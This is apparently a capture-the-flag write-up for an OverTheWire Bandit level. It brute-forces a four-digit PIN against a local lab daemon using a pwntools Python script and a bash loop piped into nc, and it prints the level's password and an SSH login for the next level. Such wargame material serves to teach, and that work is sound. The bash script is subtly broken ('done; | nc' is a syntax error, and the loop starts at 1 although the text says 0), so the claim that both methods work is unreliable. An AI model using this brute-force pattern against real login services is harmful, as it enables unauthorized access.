Let's delve into the next challenge level.

As per the challenge requirements, we need to employ brute force to exhaustively try all possible keys ranging from 0 to 9999 in order to ascertain the password for advancing to the subsequent level.

---
As customary, we have two approaches at our disposal:
1. Python Script:
    ```python
    from pwn import *
    for i in range(10000):
        conn = remote('localhost', 30002)
        conn.recvuntil("\n")
        data = b"VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar " + str(i).encode()
        conn.sendline(data)
        response = conn.recvline()
        conn.close()
        if b"Wrong! Please enter the correct pincode. Try again." in response:
            print("Failed: ", i)
        else:
            print("Key: ", i)
            if response.strip():
                print("Unexpected response:", response.strip())
            break
    ```
2. Bash Script:
    ```bash
    for i in {1..9999}
    do
        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar "$i
    done; | nc localhost 30002
    ```
The correct key is `9015`, which is obtained through both methods.  
Subsequently, upon acquiring the password, we can exit the current SSH session and proceed to connect to the subsequent level as follows:
```bash
Command: `ssh -p 2220 bandit25@bandit.labs.overthewire.org`
#Password: Password obtained from the brute force attack
```
